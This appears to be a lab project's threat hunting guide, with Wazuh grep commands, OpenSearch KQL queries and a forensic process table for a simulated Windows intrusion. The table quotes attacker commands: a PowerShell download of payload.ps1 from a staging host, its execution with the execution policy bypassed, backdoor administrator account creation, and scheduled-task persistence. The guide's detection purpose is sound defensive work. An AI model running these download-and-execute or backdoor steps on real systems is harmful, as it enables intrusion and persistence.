# SOCForge: Threat Hunting Guide & Query Catalog

This guide provides tested forensic threat hunting queries designed to detect adversary behavior and correlate multi-stage intrusion artifacts using Wazuh archives, Sysmon event logs, and OpenSearch / Wazuh Dashboard queries.

---

## Threat Hunting Methodology
<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/4a8f5eb3-4530-4cc7-ab44-d5cc7cef73b0" />


---

## 1. Linux / Wazuh Server Threat Hunting Queries

Run these commands directly on the Wazuh Manager host (`/var/ossec/logs/archives/archives.json`):

### Hunt #1: Master LOLBin & Script Execution Hunt (Sysmon Event ID 1)
Identifies all process creation events from Windows agents involving PowerShell, script execution, task scheduling, or account tools.

```bash
sudo grep -E '"agent":{"id":"002".*"eventID":"1"' \
  /var/ossec/logs/archives/archives.json \
  | grep -Ei 'powershell|payload\.ps1|schtasks|net\.exe|net1\.exe|cmd\.exe' \
  | tail -30
```

### Hunt #2: Scheduled Task Creation & Tampering (Persistence & Eradication)
Searches for task creation, query, and deletion events across Sysmon Process Creation (EID 1), Image Load (EID 7), and Registry operations (EID 12).

```bash
sudo grep -Ei 'SOCForgePersistence|schtasks\.exe' \
  /var/ossec/logs/archives/archives.json | tail -25
```

### Hunt #3: Account Discovery, Creation, and Deletion
Tracks the complete lifecycle of local backdoor accounts (`net user /add` → `net localgroup administrators /add` → `net user /delete`).

```bash
sudo grep -Ei 'socforge_backdoor|net\.exe|net1\.exe' \
  /var/ossec/logs/archives/archives.json | tail -30
```

### Hunt #4: Ingress Tool Transfer & Staging C2 Traffic
Finds outbound connections to attacker infrastructure (`192.168.56.101:8080`) and files written to temporary staging locations.

```bash
sudo grep -Ei '192\.168\.56\.101|payload\.ps1|SOCForge Stager' \
  /var/ossec/logs/archives/archives.json | tail -25
```

### Hunt #5: Fired Wazuh Alert Summary
Filters `alerts.json` for custom SOCForge detection rules (`100100`–`100105`) and high-severity built-in rules.

```bash
sudo grep -E '"id":"(100100|100101|100102|100103|100104|100105|92027|92029|92057|92004|92154)"' \
  /var/ossec/logs/alerts/alerts.json | tail -20
```

---

## 2. Wazuh Dashboard / OpenSearch KQL Queries

For analysts investigating through the Wazuh Web UI / OpenSearch Discover:

| Threat Category | KQL Filter Query |
|:---|:---|
| **Encoded PowerShell** | `data.win.eventdata.commandLine: *EncodedCommand* OR data.win.eventdata.commandLine: *-enc*` |
| **Command Shell from PowerShell** | `data.win.eventdata.parentImage: *powershell.exe AND data.win.eventdata.image: *cmd.exe` |
| **Scheduled Task Creation** | `data.win.eventdata.image: *schtasks.exe AND data.win.eventdata.commandLine: */create*` |
| **Local Account Creation** | `(data.win.eventdata.image: *net.exe OR data.win.eventdata.image: *net1.exe) AND data.win.eventdata.commandLine: */add*` |
| **C2 Web Traffic** | `data.win.eventdata.destinationIp: "192.168.56.101" AND data.win.eventdata.destinationPort: "8080"` |
| **Temporary File Drops** | `data.win.eventdata.targetFilename: *\\Windows\\Temp\\*` |

---

## 3. Forensic ProcessGUID Correlation Table

| ProcessGUID | Image | Command Line | Incident Role |
|:---|:---|:---|:---|
| `{690382b0-3343-6a8f-2a04-000000000f00}` | `powershell.exe` | *Attacker interactive session* | Root parent process (PID 572) |
| `{690382b0-41d7-6a8f-7304-000000000f00}` | `powershell.exe` | `-NoProfile -Command "whoami; hostname; ipconfig"` | Discovery parent (PID 6180) |
| `{690382b0-425a-6a8f-7a04-000000000f00}` | `powershell.exe` | `-NoProfile -EncodedCommand VwByAGkA...` | Obfuscation (PID 1680) |
| `{690382b0-42da-6a8f-7b04-000000000f00}` | `cmd.exe` | `/c "whoami && netstat -ano"` | Command Shell execution (PID 6136) |
| `{690382b0-49b9-6a8f-8c04-000000000f00}` | `schtasks.exe` | `/create /tn SOCForgePersistence ...` | Persistence creation (PID 5704) |
| `{690382b0-49c8-6a8f-8d04-000000000f00}` | `schtasks.exe` | `/delete /tn SOCForgePersistence /f` | Eradication (PID 7016) |
| `{690382b0-4b2b-6a8f-9204-000000000f00}` | `net.exe` | `user socforge_backdoor ... /add` | Account creation (PID 5000) |
| `{690382b0-4b2f-6a8f-9404-000000000f00}` | `net.exe` | `localgroup administrators ... /add` | Privilege escalation (PID 1944) |
| `{690382b0-4b8c-6a8f-a204-000000000f00}` | `net.exe` | `user socforge_backdoor /delete` | Eradication (PID 6980) |
| `{690382b0-7455-6a8f-2a05-000000000f00}` | `powershell.exe` | `Invoke-WebRequest -Uri 'http://192.168.56.101:8080/payload.ps1' ...` | C2 Staging download (PID 8052) |
| `{690382b0-7457-6a8f-2b05-000000000f00}` | `powershell.exe` | `-ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1` | Payload execution (PID 4688) |
